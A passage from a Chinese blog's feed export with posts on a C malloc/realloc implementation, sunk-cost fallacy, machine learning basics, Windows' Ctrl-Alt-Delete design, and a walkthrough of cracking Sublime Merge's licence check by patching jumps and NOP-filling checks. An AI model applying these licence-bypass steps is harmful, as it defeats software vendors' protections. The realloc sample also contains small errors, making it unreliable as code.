i<span class="token punctuation">;</span>    sdata <span class="token operator">=</span> src<span class="token operator">-&gt;</span>ptr<span class="token punctuation">;</span>    ddata <span class="token operator">=</span> dst<span class="token operator">-&gt;</span>ptr<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">&lt;</span> src<span class="token operator">-&gt;</span>size <span class="token operator">&amp;&amp;</span> i <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">&lt;</span> dst<span class="token operator">-&gt;</span>size<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>        ddata<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> sdata<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>8.2、实现realloc</strong>为了更高效，我们考虑以下几个方面：</p><ol type="1"><li>如果当前block的数据区大于等于realloc要求的size，则考虑能不能split，然后直接返回</li><li>如果新的size变小了，考虑split</li><li>如果当前block的数据区不能满足size，但是其后继block是free，并且合并后可以满足size，则考虑合并，然后再考虑能不能split</li><li>如果以上都不行，则调用malloc重新分配size大小内存，然后内存复制</li></ol><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">realloc</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>p<span class="token punctuation">,</span> size_t size<span class="token punctuation">)</span><span class="token punctuation">{</span>    size_t s<span class="token punctuation">;</span>    t_block b<span class="token punctuation">,</span> _new<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>p<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">valid_addr</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        s <span class="token operator">=</span> <span class="token function">align4</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>        b <span class="token operator">=</span> <span class="token function">get_block</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>b<span class="token operator">-&gt;</span>size <span class="token operator">&gt;=</span> s<span class="token punctuation">)</span> <span class="token comment">//如果size变小了，考虑split</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>b<span class="token operator">-&gt;</span>size <span class="token operator">-</span> s <span class="token operator">&gt;=</span> <span class="token punctuation">(</span>BLOCK_SIZE <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">split_block</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token comment">//如果当前block的数据区不能满足size</span>        <span class="token punctuation">{</span>            <span class="token comment">//如果后继block是free的，并且合并后大小满足size，考虑合并</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>b<span class="token operator">-&gt;</span>next <span class="token operator">&amp;&amp;</span> b<span class="token operator">-&gt;</span>next<span class="token operator">-&gt;</span>free <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>b<span class="token operator">-&gt;</span>size <span class="token operator">+</span> BLOCK_SIZE <span class="token operator">+</span> b<span class="token operator">-&gt;</span>next<span class="token operator">-&gt;</span>size<span class="token punctuation">)</span> <span class="token operator">&gt;=</span> s<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token function">fusion</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//合并后满足size，再看能不能split</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>b<span class="token operator">-&gt;</span>size <span class="token operator">-</span> s <span class="token operator">&gt;=</span> <span class="token punctuation">(</span>BLOCK_SIZE <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token function">split_block</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span> <span class="token comment">//以上都不满足，则malloc新区域</span>            <span class="token punctuation">{</span>                newp <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>newp<span class="token punctuation">)</span>                    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token comment">//内存复制</span>                _new <span class="token operator">=</span> <span class="token function">get_block</span><span class="token punctuation">(</span>newp<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">copy_block</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token keyword">new</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">free</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> newp<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> p<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>九、总结</strong></p><p>以上是一个比较简陋，存在很大的优化空间，但大致阐述了malloc的机制，这也是本篇博文的目的。</p><p>对于更好的优化读者可以参考<a href="https://link.zhihu.com/?target=http%3A//blog.csdn.net/wenqian1991/article/details/27968779">linux内核伙伴算法</a>、以及<a href="https://link.zhihu.com/?target=http%3A//blog.csdn.net/wenqian1991/article/details/19605727">STL空间配置器</a>。</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> C </tag>
            
            <tag> 锐格 </tag>
            
            <tag> 内存 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从“沉没成本谬误”到“损失厌恶情结”</title>
      <link href="/2022/04/19/cong-chen-mei-cheng-ben-miu-wu-dao-sun-shi-yan-e-qing-jie/"/>
      <url>/2022/04/19/cong-chen-mei-cheng-ben-miu-wu-dao-sun-shi-yan-e-qing-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="思维的误区从沉没成本谬误到损失厌恶情结">思维的误区：从“沉没成本谬误”到“损失厌恶情结”</h1><p>**Author: program-think</p><p><strong>文章目录</strong></p><ul><li><a href="#啥是沉没成本">啥是“沉没成本”？</a></li><li><a href="#啥是沉没成本谬误">啥是“沉没成本谬误”？</a></li><li><a href="#沉没成本谬误举例">“沉没成本谬误”举例</a></li><li><a href="#沉没成本谬误的心理成因">“沉没成本谬误”的心理成因</a></li><li><a href="#先看几个小测试">先看几个小测试</a></li><li><a href="#什么是损失憎恶损失规避情结">什么是“损失憎恶/损失规避”情结？</a></li><li><a href="#你知道对损失的厌恶有多强烈吗">你知道“对损失的厌恶”有多强烈吗？</a></li><li><a href="#如何用损失憎恶情结进行误导忽悠和洗脑">如何用“损失憎恶情结”进行误导、忽悠和洗脑？</a></li><li><a href="#结尾">结尾</a></li></ul><p>本来在琢磨另一篇博文，其中涉及到“沉没成本”的概念。转念一想，改为写一篇关于“沉没成本谬误”的博文，也算是继续普及心理素质。</p><h2 id="啥是沉没成本">啥是“沉没成本”？</h2><p>　“沉没成本”（sunkcost）是一个经济领域的概念，指的是已经付出并且【不可能】收回的成本。　比如你花钱买了某个商品，并且是不允许退货的。那么你已经花掉的钱就属于“沉没成本”。</p><h2 id="啥是沉没成本谬误">啥是“沉没成本谬误”？</h2><p>　“沉没成本谬误”（sunk costfallacy）。刚才说了，“沉没成本”是【不】可挽回滴。因此，一个足够理性的人，不会拿“沉没成本”作为对未来决策的参考依据。但实际上，绝大部分人都是很感性的，所以这些很感性的人在作决策的时候，会受到之前的沉没成本的影响，并作出不那么理智的决策。</p><p>　这么说比较抽象，给大伙儿举一个例子。</p><p>　上世纪60年代，英法两国联手研发大型超音速民航客机（协和客机）。懂行的同学应该晓得——这玩意儿很烧钱滴。搞到半途，参与其中的很多专家已经意识到——继续搞下去没戏。但是前期已经砸进去好多银子，如果半途终止，前面那些银子岂不是白花了？所以两国政府就硬着头皮继续搞。又砸进去更多的银子（据说总费用超预算8倍），终于搞出来了。但是根本没有竞争力，最后草草收场（前后总共才只有16架投入民航运营）。　因为协和客机的例子太有名了，所以“沉没成本谬误”有时候也称为“协和效应”。</p><h2 id="沉没成本谬误举例">“沉没成本谬误”举例</h2><p>为了加深大家的印象，再来举几个例子。</p><h3 id="炒股的例子">炒股的例子</h3><p>比如股市在北京奥运那年猛跌，（截至本文时）已经跌去一半都不止。很多股民从6000点就一直套牢到现在。</p><p>当大盘跌到5000点的时候，他们想，这可能是短期的阶段性调整，于是没有止损；大盘到4000点的时候，很多人想，5000点都没有割肉，这时候割肉岂不是很傻，于是又忍着......然后就一直等到如今2000点。你说悲催吧？</p><h3 id="恋人的例子">恋人的例子</h3><p>比如有一对恋人已经谈10年，性格等诸多方面还是合不来。继续谈下去，短期内也看不到改善的希望。如果双方都够理智的话，应该当机立断分手。但是两人都觉得，如果分手了，之前谈了那么多年，岂不是白费了？于是就继续拖下去，青春年华就这样耗在里面了。</p><h3 id="排队的例子">排队的例子</h3><p>假设你去吃饭，你选中那家餐厅人多，需要排队叫号。然后你拿了一个号等着。但是等了30分钟还是没轮到你。这时候你饥饿难耐，而且边上有另一个同样档次的店已经空出来了。这时候你是选择继续在这家等（继续挨饿），还是选择去边上的另一家店就餐（无需再等）？</p><p>大多数人会选择继续等。他们的理由是：刚才已经等了30分钟；如果中途放弃，刚才30分钟岂不是白等了？</p><h3 id="度假的例子">度假的例子</h3><p>我估计，很多读者都属于上述三个例子之一，所以某些读者会为自己作一些辩解。下面再举最后一个例子，也是一个特别傻的例子——傻到让你无可辩驳。</p><p>某个心理学家作了一个实验，设想了如下一个场景：</p><blockquote><p>假设你很喜欢度假。半年前，你花2万元买了一个度假的全套服务（不可退款）。前几天你又看到另一个【更好的】度假项目，只要1万元，然后你又买了（同样是不可退款）。等你买了第二个之后，才发现这两项目的时间是冲突的（你只能去其中一个），而这两个项目都不可转让（必须你本人去）。这时候</p></blockquote><p>你会选择去哪一个？</p><p>针对很多人作了上述这个测试，大部分人选择去2万元那个（也就是【较差的】那个）。为啥明明有更好的，却选择去差的那个捏？这不是很傻逼吗？根本原因在于，很多人不愿意看到这2万元白花了——“沉没成本”误导了你的决策。</p><h2 id="沉没成本谬误的心理成因">“沉没成本谬误”的心理成因</h2><p>为啥会有“沉没成本谬误”捏？我总结了如下几个心理学层面的原因。</p><h3 id="一致性原理">一致性原理</h3><p>一致性原理说的是：人在心理上总是企图保持各种一致性（这里所说的一致性包括心理上的不同维度和层面）。举个最简单的例子：假如你是某歌星的忠诚粉丝，觉得此人歌唱得很好。那么，即使你对这个歌星的道德水平缺乏了解，你在潜意识里面依然会认为该歌星的人品很好。</p><p>从理智的角度来看，一个人的唱歌水平，跟此人的道德水平没有必然关系。但因为一致性原则在起作用，所以粉丝才会把这两者等同起来。</p><p>再回到“沉没成本”的话题。不论是前面提到的“炒股”还是“恋人”和“排队”的例子，你稍微思考一下，都能感觉到【一致性原则】在起作用。</p><h3 id="侥幸心理">侥幸心理</h3><p>这个因素其实比较好理解。</p><p>比如在“恋人的例子”，两人都怀着某种侥幸心理，以为再相处一段时间，关系就能够改善。为啥说这是侥幸心理捏？因为如果10年都无法改善，那么今后发生改善的机会是很小的（“性格”这种东西，往往是年龄越大，可塑性越差）。</p><p>比如在“炒股的例子”，很多被高位套牢的股民，就是心怀侥幸，以为很快就能等来大盘反弹（可惜5-6年都没反弹）。</p><h3 id="损失憎恶心理">【损失憎恶】心理</h3><p>不过前面提到的“一致性原理”和“侥幸心理”都不是最关键滴。导致“沉没成本谬误”的【最关键因素】是“损失憎恶心理”。</p><p>很多人光看字面上的意思，以为自己已经明白啥是“损失憎恶”。其实未必哦。如果你光从字面上理解，那么你的理解多半是肤浅的，【未】切中要害。因为这个效应包含了一些可能令你意想不到的东西。</p><h2 id="先看几个小测试">先看几个小测试</h2><p>　为了让大伙儿更好地理解“损失厌恶”这个心理学效应，咱们来做几个小测试。</p><h3 id="测试1">测试1</h3><p>如下两个方案让你选，你会选哪个？</p><blockquote><p>方案A（保守方案）： 铁定赚1000元</p><p>方案B（激进方案）： 有 50% 的可能性会赚到2000元，另有 50%的可能性没有赚到钱</p></blockquote><p>经过心理学实验的测试，大部分人选“方案A”。</p><h3 id="测试2">测试2</h3><p>如下两个方案让你选，你会选哪个？</p><blockquote><p>方案A（保守方案）： 铁定损失1000元</p><p>方案B（激进方案）： 有 50% 的可能性会损失2000元，另有 50%的可能性没有任何损失 　　经过心理学测试，大部分人选“方案B”。</p></blockquote><h3 id="问题">问题</h3><p>如果你稍微懂点概率，应该明白：不论是第1个测试还是第2个测试，作为候选的两个方案，从概率学的角度讲是【等价】滴。</p><p>那为啥大部分人在第1个测试中采用保守策略，但却在第2个测试中改用激进策略？心理学上的“损失憎恶情结”可以回答这个问题。</p><h2 id="什么是损失憎恶损失规避情结">什么是“损失憎恶/损失规避”情结？</h2><p>“损失憎恶”也叫“损失厌恶”或“损失规避”，洋文叫做“lossaversion”，英文维基百科的页面在“<a href="https://en.wikipedia.org/wiki/Loss_aversion">这里</a>”。</p><p>前面说过了，千万不要只从字面上理解这个概念。因为即使是傻子也明白，人都是偏好收益，讨厌损失的。如果只是包含这么肤浅的含义，它就不会成为心理学领域的重要概念了。</p><p>这个概念的关键点在于：<strong>损失产生的消极情绪【远远超过】收益产生的积极情绪</strong>。</p><p>在第一个测试中，你面临的2个选择都不涉及损失，这时候大多数人会选择保守策略——这个很容易解释。马斯洛的“需求层次理论”（hierarchyofneeds）中，“安全性需求”仅次于“生理需求”。也就是说，在不威胁到生理需求的前提下，大部分人都优先考虑“安全性需求”。选择“保守策略”（不用冒风险）自然是符合“安全性需求”的。</p><p>但是在第二个测试中，为啥大多数人反而选择“冒险策略”？因为第二个测试的“A方案”，其损失是必然发生的。面对这种【必然性】的损失，内心的“损失憎恶情结”就起作用啦。大多数人为了规避这种“必然性的损失”，宁可冒险赌一把。</p><h2 id="你知道对损失的厌恶有多强烈吗">你知道“对损失的厌恶”有多强烈吗？</h2><p>要了解“对损失的厌恶”强烈到何种程度，再来看第三个测试。</p><p>如下两个方案让你选，你会选哪个？</p><blockquote><p>方案A： 铁定损失800元</p><p>方案B： 有 50% 的可能性会损失2000元，另有 50%的可能性没有任何损失</p></blockquote><p>稍微有点概率常识的同学，肯定意识到“方案B”（等价于损失1000元）明显比“方案A”【更差】。但是经过心理学测试，大部分被测试的人还是选“方案B”。</p><p>那么，收益要达到多大的比例，才能抵消对损失的厌恶情绪捏？这个比例肯定是因人而异滴。通常越理性的人，这个比例越接近1；反之则越大。</p><p>曾经在一本心理学的书籍中看到说，“对损失的厌恶”最多的情况下会2倍于“对收益的满足”。也就是说，如果某人的“损失憎恶情结”特别强烈，那么潜在收益要达到损失的2倍，他/她才会觉得两者是相当的。对应到“测试3”，需要把“方案A”中“铁定损失的金额”调整为500，那么这些人才会觉得这两个方案是差不多的。</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://lh4.googleusercontent.com/E8iB44q-Z2Kc7xmcYGzhqsUdVnvdEsBFn9VWs11T-j13Wp5dSq1G9EXLZD0V8RuBqx_3eU7F5tBxTT8wS8C8k0MyebuVb0f8JBRfFkpEHwpQDF6vVHKLrULEAl3ORwAe1QRT"></p><p>在上图中，请注意在原点附近的曲线——第三象限比第一象限要陡峭，这个“陡峭”就体现出——“损失产生的消极情绪【超过】收益产生的积极情绪”。</p><p>某些比较善于思考的同学会问：为啥在远离原点的地方，曲线又变平缓了？这其实涉及到另一个心理学的话题——“边际效用递减”。</p><h2 id="如何用损失憎恶情结进行误导忽悠和洗脑">如何用“损失憎恶情结”进行误导、忽悠和洗脑？</h2><p>“损失憎恶情结”已经在很多领域（尤其是营销领域）被广泛使用了。稍微举几个例子。</p><h3 id="买车的例子">买车的例子</h3><p>如今买私家车的同学越来越多啦。买车的过程中有一个环节是选择你要的附属品（比如内置音箱、等等），每选择一种附属品都要支付额外的费用。国外的心理学家做过一个相关的测试，他们采用两种方式让买车的人选择附属品。</p><blockquote><p>选择方式1：在一个表格中列出所有的附属品，让买家把【不要】的附属品【划掉】。</p><p>选择方式2：在一个表格中列出所有的附属品，让买家把【想要】的附属品【打勾】。</p></blockquote><p>对于比较理性的人而言，这两种方式应该是等价的。但是实际测试下来，对于“方式1”，买家购买了【更多】的附属品。</p><p>为啥会这样捏？“方式1”的这种做法，会让买家在潜意识里面感觉那些附属品已经是汽车的一部分，“划掉某个选项”更像是某种“损失”。对损失的厌恶会让买家去掉比较少的选项（相对于“方式2”而言）。</p><h3 id="售楼处的例子">售楼处的例子</h3><p>很多售楼小姐都会用一个诈术——忽悠说该楼盘已经卖得差不多了，只剩下少数几套。某些买家被这样一忽悠，就会匆忙下订金。这个招数能奏效，原因之一依然是“损失憎恶情结”。在这个例子中，买家害怕的是【购买机会的损失】。</p><p>如果你对周围的环境稍微留意一下，你会发现：很多行业的营销人员，都擅长制造“机会即将失去”的紧张气氛。而且这招屡试不爽。</p><h2 id="结尾">结尾</h2><p>日常生活中，你是否也碰到过“沉没成本谬误”和“损失憎恶情结”？<br>生活中的各式宣传中，是否也采用了本文提及的“沉没成本谬误”和“损失憎恶情结”？</p>]]></content>
      
      
      
        <tags>
            
            <tag> 生活 </tag>
            
            <tag> 哲学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>勿将数据分析中的深度学习与机器学习混为一谈</title>
      <link href="/2022/04/13/wu-jiang-shu-ju-fen-xi-zhong-de-shen-du-xue-xi-yu-ji-qi-xue-xi-hun-wei-yi-tan/"/>
      <url>/2022/04/13/wu-jiang-shu-ju-fen-xi-zhong-de-shen-du-xue-xi-yu-ji-qi-xue-xi-hun-wei-yi-tan/</url>
      
        <content type="html"><![CDATA[<h1 id="勿将深度学习与机器学习混为一谈">勿将深度学习与机器学习混为一谈</h1><blockquote><p>虽说机器学习和深度学习都能发现数据中的模式与特征，但是它们所涉及到的技术和具体的应用场景却截然不同。</p></blockquote><p>众所周知，虽然同属于人工智能的范畴，但是深度学习是一种特殊的机器学习形式。从流程上说，机器学习和深度学习都是从运用测试数据来训练某个模型开始，通过一系列的优化过程，进而找到最适合模型的数据权重。显然，这两种方法都可以处理数值(回归)和非数值(分类)的问题，只是在对象识别和语言翻译等应用领域，深度学习模型往往比机器学习模型更加适用。</p><h2 id="细说机器学习">细说机器学习</h2><p>机器学习算法通常分为：<strong>监督</strong>(用各种答案来标注训练数据)和<strong>非监督</strong>(任何可能存在的标签都不会被显示在训练算法中)两种。</p><p>监督式机器学习又可以进一步被分为：<strong>分类</strong>(预测诸如：抵押贷款支付逾期的概率等非数字性的答案)和<strong>回归</strong>(预测诸如：某种网红商品的销售量等数字性的答案)。</p><p>无监督学习则可以进一步分为：<strong>聚类</strong>(查找相似对象组，如：跑步鞋、步行鞋和礼服鞋)、<strong>关联</strong>(查找对象的共同逻辑，如：咖啡和奶油)、以及降维(进行投射、特征选择与提取)。</p><h3 id="分类算法">分类算法</h3><p>分类问题属于<strong>监督式学习</strong>范畴。它需要在<strong>两个或多个类</strong>之间进行选择，并最终为每一个类分配概率。最常见的算法包括：朴素贝叶斯、决策树、逻辑回归、k近邻和支持向量机(SVM)。您还可以使用诸如：随机森林等其他集成方法(模型的组合)，以及AdaBoost和XGBoost之类的增强方法。</p><h3 id="回归算法">回归算法</h3><p>回归问题也属于<strong>监督式学习</strong>范畴。它要求模型<strong>能够预测出一个数字</strong>。其中最简单且最快的算法是线性(最小二乘)回归。不过它通常只能给出一个不够准确的结果。其他常见的机器学习回归算法(除了神经网络)还包括：朴素贝叶斯、决策树、k近邻、LVQ(学习矢量量化)、LARS（最小角回归）、Lasso、弹性网络、随机森林、AdaBoost和XGBoost等。显然，在回归和分类的机器学习算法之间有一定的重叠度。</p><h3 id="聚类算法">聚类算法</h3><p>聚类问题属于<strong>无监督式学习范畴</strong>。它要求模型<strong>找出相似的数据点组</strong>。其中最流行的算法是K-Means聚类。其他常见的算法还包括：均值漂移聚类、DBSCAN(基于密度的带噪声应用空间聚类)、GMM(高斯混合模型)和HAC(凝聚层级聚类)。</p><h3 id="降维算法">降维算法</h3><p>降维问题也属于<strong>无监督式学习范畴</strong>。它要求模型<strong>删除或合并那些对结果影响很小或没有影响的变量</strong>。它通常与分类或回归结合起来使用。常见降维算法包括：删除缺失值较多的变量、删除低方差的变量、决策树、随机森林、删除或合并高相关性的变量、后向特征消除、前向特征选择、因子分析、PCA（主成分分析）等。</p><h3 id="各种优化方法">各种优化方法</h3><p>我们需要通过训练和评估，优化参数的权重，来找到一组最接近真实情况的数值，进而将监督式学习算法最终转化为恰当的模型。在实际应用中，这些算法的优化常常依赖于那些陡降的变体，例如：随机梯度下降，它本质上是在随机起点上执行多次陡降（steepestdescent）。</p><p>而对于随机梯度下降法的常见改进包括：根据动量修正梯度的方向因素，或调整从一个数据(或称为<em>epoch</em>或<em>batch</em>)到下一个数据学习率的进展。</p><h3 id="数据清理">数据清理</h3><p>为了让杂乱无章的数据能够为机器学习所用，我们必须对数据进行全面的过滤，其中包括:</p><p>1.初次查看数据，排除那些有大量丢失数据的列。</p><p>2.再次查看数据，选择需要进行预测的列(即，特征选择)。这也是您在迭代时可能希望更改的内容。</p><p>3.在其余列中排除那些缺少数据的行。</p><p>4.纠正明显的拼写错误，合并相应的答案。例如：U.S.、US、USA和America都应该被合并为一个类别。</p><p>5.排除具有超出范围数据的行。例如：如果您正在分析纽约市内出租车的出行情况，那么您需要过滤掉那些开到该城市区域边界之外的地理坐标行。</p><p>当然，也可以酌情增加其他步骤，这主要取决于您收集到的数据类型。您甚至可以在机器学习管道（<a href="https://www.infoworld.com/article/3198252/data-in-intelligence-out-machine-learning-pipelines-demystified.html">参见</a>）中设置一些数据清理的步骤，以便按需进行修改与复用。</p><h3 id="数据编码和标准化">数据编码和标准化</h3><p>为了对数据进行分类，您需要将文本标签编码为另一种形式。常见的有如下两种：</p><p>一种是label编码，它将每一个文本标签值都替换为一个数字。另一种是one-hot编码，它将每一个文本标签值都替换为带有二进制值(1或0)的列。一般来说，由于label编码有时会使机器学习算法误认为：被编码的列已经是一个有序列了，因此我们首选采用one-hot编码。</p><p>为了让数值数据适用于机器回归，我们通常需要对数据进行规范化。否则，更大范围的数字可能会主导特征向量之间的欧氏距离（Euclidiandistance，它是在m维空间中两个点之间的真实距离），而该影响可能会以其他字段为代价被放大，进而导致陡降的优化难以收敛。目前，针对机器学习的数据规范化与标准化有着多种方法，其中包括：最小值标准化、均值标准化、以及按单位长度扩展等。有时该过程也被称为特性扩展（<a href="https://en.wikipedia.org/wiki/Feature_scaling">FeatureScaling</a>）。</p><h3 id="特征工程">特征工程</h3><p>特征是指<strong>被观察到的现象的可测量特性</strong>。“特征”的概念通常与解释变量相关。此处的解释变量，经常被用于诸如线性回归之类的统计技术。而特征向量则会将单行的所有特征，组合成一个数值型的向量。</p><p>选择特征的巧妙之处在于<strong>是否能选出解释问题的最小独立变量集</strong>。如果两个变量<strong>高度相关</strong>，则要么将它们合并成为一个单独的特征，要么去掉其中的一个。有时候，<strong>我们在进行主成分分析时，可以把相关的变量转换成一组线性无关的变量</strong>。</p><p>在实际应用中，我们能够通过简单的方式，来构造新的特征或减少特征向量的维数。例如，用死亡年份减去出生年份，就得到了死亡年龄，这是针对寿命和死亡率分析的主要自变量。当然，在其他情况下，特性的构建并非如此浅显。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
            <tag> 深度学习 </tag>
            
            <tag> 流量分析 </tag>
            
            <tag> 数据清洗 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sublime Merge 破解 逆向记录</title>
      <link href="/2022/04/12/sublime-merge-ni-xiang-ji-lu/"/>
      <url>/2022/04/12/sublime-merge-ni-xiang-ji-lu/</url>
      
        <content type="html"><![CDATA[<h1 id="sublime-merge-破解-逆向记录">Sublime Merge 破解 逆向记录</h1><p>找遍全网，似乎都没有Sublime Merge的破解。</p><h2 id="分析">分析</h2><p>打开程序，跳过暂停，直到程序显示主界面。</p><p><img src="https://googles.plus/images/loading.gif" data-original="/images/slmerge.png"></p><p>提示未注册</p><p><img src="https://googles.plus/images/loading.gif" data-original="/images/6d194a72881b81e7965fc0388b39cbf8.png"></p><p>搜索字符串，期待定位判断函数</p><p><img src="https://googles.plus/images/loading.gif" data-original="/images/5862063bd362a33e6c8a812bea55fad1.png"></p><p><img src="https://googles.plus/images/loading.gif" data-original="/images/fc9cfd4669c0c92d44ddaf064355d957.png"></p><p>字符串上方有一个<code>jmp</code>跳过未激活消息，那<code>jmp</code>下面的<code>move ecx,220</code>就是关于界面未注册赋值的入口，</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">cmp byte ptr ds:[rsi],0je sublime_merge.7FF6254D12BA<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>cmp为关键比较je为关键跳转，cmp处下断点运行，再次点击关于，断下来到断点处，<strong>FPU</strong>中<strong>RSI</strong>寄存器值指向了地址<code>13FFD5ED8</code></p><p><img src="https://googles.plus/images/loading.gif" data-original="/images/0e01f174fc51db840cf2042204790f8e.png"></p><p><img src="https://googles.plus/images/loading.gif" data-original="/images/593d3e2e218aec41f485bd47ac331d6e.png"></p><p><img src="https://googles.plus/images/loading.gif" data-original="/images/831cc788ad351037dd081f2af7c50094.png"></p><p>窗口重新聚焦后的内存访问</p><p><img src="https://googles.plus/images/loading.gif" data-original="/images/99cac458972229c0ad5ade524336f270.png"></p><p>这个不是我们想要的</p><p><img src="https://googles.plus/images/loading.gif" data-original="/images/5b94502a54233a934641cf46a2edc64f.png"></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">cmp byte ptr ds:[rax],0jne sublime_merge.7FF6254E91F4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>是在判断我们的许可证状态</p><p><img src="https://googles.plus/images/loading.gif" data-original="/images/0b00e779864fd025c868a65fd69be5fe.png"></p><p>改为强制赋值。</p><p>在SublimeMerge运行时，不仅有窗口聚焦操作会触发许可证检查，还有切换标签页、长时间闲置等，我们需要将他们都找到，但此刻该命令阻止了我们继续调试，我们暂时将其以<strong>NOP</strong>填充，待到调试工作接近尾声时再将其恢复。</p><p>其他情况时，获取内存内激活状态：</p><p><img src="https://googles.plus/images/loading.gif" data-original="/images/4176ae07bfee4535bce5dbde9b00a684.png"></p><p><img src="https://googles.plus/images/loading.gif" data-original="/images/af8fc25673d73d5a1f62659f47230155.png"></p><p><strong>记得用NOP补充字节</strong></p><p>完美激活！</p><p><img src="https://googles.plus/images/loading.gif" data-original="/images/bf8de5cebb820fdf306dbd47c64de685.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows NT系统的Ctrl-Alt-Delete解锁设计</title>
      <link href="/2022/04/11/windows-nt-xi-tong-de-ctrl-alt-delete-jie-suo-she-ji/"/>
      <url>/2022/04/11/windows-nt-xi-tong-de-ctrl-alt-delete-jie-suo-she-ji/</url>
      
        <content type="html"><![CDATA[<p><strong>Ctrl-Alt-Delete</strong>组合键是一个安全注意键（SecureAttentionKey），其主要作用就是为了防止恶意程序<strong>通过伪造系统登陆界面的方式</strong>盗取用户的用户名和密码。</p><p>Secure Attention Key直接<strong>与操作系统内核相关联</strong>——<br>与硬件间接交互的操作系统内核可以检测是否安全注意键被按下。按下时，内核即开始受信登录处理流程。</p><p>换言之，Secure AttentionKey可看作是一个操作系统的「保留键」，当用户在已解锁的任意界面按下Ctrl-Alt-Delete等SecureAttentionKey的时候，系统就会<strong>以最高优先级弹出一个遮罩全屏的菜单</strong>，其中包含:锁定/切换用户/注销/更改密码/任务管理器；或选择终止全部进程，从而遮挡/终止这个通过伪造登陆界面的恶意软件的进程，并进行可信登陆流程处理。（整个过程和任务管理器类似，拥有几乎最高的CPU优先级，所以在系统失去响应的情况下也可以成功执行）</p><p>假设一个伪造登陆界面的恶意软件要求用户按<code>Ctrl-Alt-Delete</code>或其他SecureAttentionKey进行登陆，那么系统会弹出真正的系统组件从而让用户意识到这是一个伪造的登陆界面，从而避免引发安全问题；如果恶意软件伪造的登陆界面没有要求用户按<code>Ctrl-Alt-Delet</code>e登陆，那么已经养成了按<code>Ctrl-Alt-Delete</code>登陆习惯的用户会起疑心。</p><p>在早期的Windows NT 